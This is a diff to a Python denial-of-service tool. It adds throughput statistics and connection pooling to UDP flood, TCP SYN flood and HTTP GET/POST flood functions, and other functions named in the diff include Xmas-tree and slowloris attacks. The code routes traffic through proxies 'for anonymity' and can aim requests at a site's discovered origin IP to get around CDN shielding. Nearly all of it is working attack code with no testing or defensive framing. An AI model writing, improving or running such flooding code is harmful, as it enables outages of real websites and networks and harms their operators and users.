@@ -14,6 +14,12 @@ proxy_index = 0
 proxy_lock = threading.Lock()
 debug_mode = False  # Debug mode for live output
 
+# Statistics tracking
+stats_lock = threading.Lock()
+successful_requests = 0
+failed_requests = 0
+bytes_sent = 0
+
 def load_proxies():
     """Load proxies from proxies.txt or manual input"""
     global proxy_list
@@ -152,17 +158,34 @@ def udp_plain_flood(ip, port, duration, packet_size):
     packet_count = 0
     payload = b"A" * packet_size
     print(f"[🚀] UDP Plain Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
+    
+    start_time = time.time()
+    last_stats_time = start_time
+    
     try:
         while time.time() < end_time:
             sock.sendto(payload, (ip, port))
             packet_count += 1
-            if debug_mode and packet_count % 100 == 0:
+            
+            # Show statistics every 5 seconds
+            current_time = time.time()
+            if current_time - last_stats_time >= 5:
+                elapsed = current_time - start_time
+                rate = packet_count / elapsed if elapsed > 0 else 0
+                bandwidth = (packet_count * packet_size) / (1024 * 1024) / elapsed if elapsed > 0 else 0
+                print(f"[📊] Stats: {packet_count} packets | {rate:.0f} pkt/s | {bandwidth:.2f} MB/s")
+                last_stats_time = current_time
+                
+            if debug_mode and packet_count % 1000 == 0:
                 print(f"[DEBUG] Sent {packet_count} packets to {ip}:{port}")
     except Exception as e:
         print(f"[❌] Error: {e}")
     finally:
         sock.close()
-        print(f"[✅] Done! Sent {packet_count} packets.")
+        elapsed = time.time() - start_time
+        rate = packet_count / elapsed if elapsed > 0 else 0
+        bandwidth = (packet_count * packet_size) / (1024 * 1024) / elapsed if elapsed > 0 else 0
+        print(f"[✅] Done! Sent {packet_count} packets | {rate:.0f} pkt/s | {bandwidth:.2f} MB/s")
 
 def udp_random_flood(ip, port, duration, packet_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -246,18 +269,34 @@ def tcp_syn_flood_single(ip, port, duration):
     end_time = time.time() + duration
     packet_count = 0
     print(f"[🚀] TCP SYN Flood (Single) on {ip}:{port} | {duration}s...")
+    
+    start_time = time.time()
+    last_stats_time = start_time
+    
     try:
         while time.time() < end_time:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
             sock.connect_ex((ip, port))
             sock.close()
             packet_count += 1
-            if debug_mode and packet_count % 50 == 0:
+            
+            # Show statistics every 5 seconds
+            current_time = time.time()
+            if current_time - last_stats_time >= 5:
+                elapsed = current_time - start_time
+                rate = packet_count / elapsed if elapsed > 0 else 0
+                print(f"[📊] Stats: {packet_count} SYN packets | {rate:.0f} pkt/s")
+                last_stats_time = current_time
+                
+            if debug_mode and packet_count % 100 == 0:
                 print(f"[DEBUG] Sent {packet_count} SYN packets to {ip}:{port}")
     except Exception as e:
         print(f"[❌] Error: {e}")
     finally:
-        print(f"[✅] Done! Sent {packet_count} SYN packets.")
+        elapsed = time.time() - start_time
+        rate = packet_count / elapsed if elapsed > 0 else 0
+        print(f"[✅] Done! Sent {packet_count} SYN packets | {rate:.0f} pkt/s")
 
 def tcp_syn_flood_multi(ip, port, duration):
     end_time = time.time() + duration
@@ -371,10 +410,23 @@ def tcp_xmas_flood(ip, port, duration):
 
 # HTTP/HTTPS Flood Methods
 def http_get_flood(url, duration, use_origin=False):
+    global successful_requests, failed_requests, bytes_sent
     end_time = time.time() + duration
     request_count = 0
+    local_success = 0
+    local_failed = 0
     session = requests.Session()
     session.verify = False
+    
+    # Connection pooling for better performance
+    adapter = requests.adapters.HTTPAdapter(
+        pool_connections=100,
+        pool_maxsize=100,
+        max_retries=0
+    )
+    session.mount('http://', adapter)
+    session.mount('https://', adapter)
+    
     use_proxies = len(proxy_list) > 0
     
     # Parse domain for origin IP discovery
@@ -391,6 +443,9 @@ def http_get_flood(url, duration, use_origin=False):
     if use_proxies:
         print(f"[🔒] Using {len(proxy_list)} proxies for anonymity")
     
+    start_time = time.time()
+    last_stats_time = start_time
+    
     try:
         while time.time() < end_time:
             try:
@@ -402,38 +457,67 @@ def http_get_flood(url, duration, use_origin=False):
                 # Set realistic headers
                 headers = get_realistic_headers(referer=url)
                 
-                if debug_mode and request_count % 10 == 0:
-                    print(f"[DEBUG] Request #{request_count} | User-Agent: {headers['User-Agent'][:50]}...")
-                
                 # Target origin IP if found, otherwise use URL
                 if target_ips and use_origin:
                     target_url = url.replace(domain, random.choice(target_ips))
-                    headers['Host'] = domain  # Keep original domain in Host header
-                    if debug_mode and request_count % 10 == 0:
-                        print(f"[DEBUG] Targeting origin IP: {target_url}")
+                    headers['Host'] = domain
                 else:
                     target_url = url
                 
-                response = session.get(target_url, headers=headers, timeout=0.5)
+                response = session.get(target_url, headers=headers, timeout=3, allow_redirects=False)
+                local_success += 1
+                with stats_lock:
+                    successful_requests += 1
+                    bytes_sent += len(response.content)
+                
                 if debug_mode and request_count % 10 == 0:
-                    print(f"[DEBUG] Response: {response.status_code} | Size: {len(response.content)} bytes")
+                    print(f"[DEBUG] Request #{request_count} | Status: {response.status_code} | Size: {len(response.content)} bytes")
             except Exception as e:
+                local_failed += 1
+                with stats_lock:
+                    failed_requests += 1
                 if debug_mode and request_count % 10 == 0:
                     print(f"[DEBUG] Request failed: {str(e)[:50]}")
-                pass
+            
             request_count += 1
+            
+            # Show statistics every 5 seconds
+            current_time = time.time()
+            if current_time - last_stats_time >= 5:
+                elapsed = current_time - start_time
+                rate = request_count / elapsed if elapsed > 0 else 0
+                success_rate = (local_success / request_count * 100) if request_count > 0 else 0
+                print(f"[📊] Stats: {request_count} requests | {rate:.1f} req/s | Success: {success_rate:.1f}% | Sent: {bytes_sent / 1024:.1f} KB")
+                last_stats_time = current_time
+                
     except Exception as e:
         print(f"[❌] Error: {e}")
     finally:
         session.close()
-    print(f"[✅] Done! Sent {request_count} GET requests.")
+    
+    elapsed = time.time() - start_time
+    rate = request_count / elapsed if elapsed > 0 else 0
+    print(f"[✅] Done! Sent {request_count} requests | {rate:.1f} req/s | Success: {local_success} | Failed: {local_failed}")
 
 def http_post_flood(url, duration, use_origin=False):
+    global successful_requests, failed_requests, bytes_sent
     end_time = time.time() + duration
     request_count = 0
+    local_success = 0
+    local_failed = 0
     session = requests.Session()
     session.verify = False
     payload = {"flood": "data" * 1000}
+    
+    # Connection pooling
+    adapter = requests.adapters.HTTPAdapter(
+        pool_connections=100,
+        pool_maxsize=100,
+        max_retries=0
+    )
+    session.mount('http://', adapter)
+    session.mount('https://', adapter)
+    
     use_proxies = len(proxy_list) > 0
     
     # Parse domain for origin IP discovery
@@ -450,6 +534,10 @@ def http_post_flood(url, duration, use_origin=False):
     if use_proxies:
         print(f"[🔒] Using {len(proxy_list)} proxies for anonymity")
     
+    start_time = time.time()
+    last_stats_time = start_time
+    payload_size = len(str(payload))
+    
     try:
         while time.time() < end_time:
             try:
@@ -462,31 +550,47 @@ def http_post_flood(url, duration, use_origin=False):
                 headers = get_realistic_headers(referer=url)
                 headers['Content-Type'] = 'application/x-www-form-urlencoded'
                 
-                if debug_mode and request_count % 10 == 0:
-                    print(f"[DEBUG] POST #{request_count} | Payload size: {len(str(payload))} bytes")
-                
                 # Target origin IP if found, otherwise use URL
                 if target_ips and use_origin:
                     target_url = url.replace(domain, random.choice(target_ips))
-                    headers['Host'] = domain  # Keep original domain in Host header
-                    if debug_mode and request_count % 10 == 0:
-                        print(f"[DEBUG] Targeting origin IP: {target_url}")
+                    headers['Host'] = domain
                 else:
                     target_url = url
                 
-                response = session.post(target_url, data=payload, headers=headers, timeout=0.5)
+                response = session.post(target_url, data=payload, headers=headers, timeout=3, allow_redirects=False)
+                local_success += 1
+                with stats_lock:
+                    successful_requests += 1
+                    bytes_sent += payload_size
+                
                 if debug_mode and request_count % 10 == 0:
-                    print(f"[DEBUG] Response: {response.status_code} | Size: {len(response.content)} bytes")
+                    print(f"[DEBUG] POST #{request_count} | Status: {response.status_code} | Sent: {payload_size} bytes")
             except Exception as e:
+                local_failed += 1
+                with stats_lock:
+                    failed_requests += 1
                 if debug_mode and request_count % 10 == 0:
                     print(f"[DEBUG] Request failed: {str(e)[:50]}")
-                pass
+            
             request_count += 1
+            
+            # Show statistics every 5 seconds
+            current_time = time.time()
+            if current_time - last_stats_time >= 5:
+                elapsed = current_time - start_time
+                rate = request_count / elapsed if elapsed > 0 else 0
+                success_rate = (local_success / request_count * 100) if request_count > 0 else 0
+                print(f"[📊] Stats: {request_count} requests | {rate:.1f} req/s | Success: {success_rate:.1f}% | Sent: {bytes_sent / 1024:.1f} KB")
+                last_stats_time = current_time
+                
     except Exception as e:
         print(f"[❌] Error: {e}")
     finally:
         session.close()
-    print(f"[✅] Done! Sent {request_count} POST requests.")
+    
+    elapsed = time.time() - start_time
+    rate = request_count / elapsed if elapsed > 0 else 0
+    print(f"[✅] Done! Sent {request_count} requests | {rate:.1f} req/s | Success: {local_success} | Failed: {local_failed}")
 
 def https_slowloris(url, duration):
     end_time = time.time() + duration
@@ -539,7 +643,13 @@ def validate_input(prompt, min_val, max_val, input_type=int):
             print("[❌] Invalid input! Numbers only.")
 
 def main():
-    global debug_mode
+    global debug_mode, successful_requests, failed_requests, bytes_sent
+    
+    # Reset statistics
+    successful_requests = 0
+    failed_requests = 0
+    bytes_sent = 0
+    
     print(ASCII_ART)
     
     # Enable debug mode
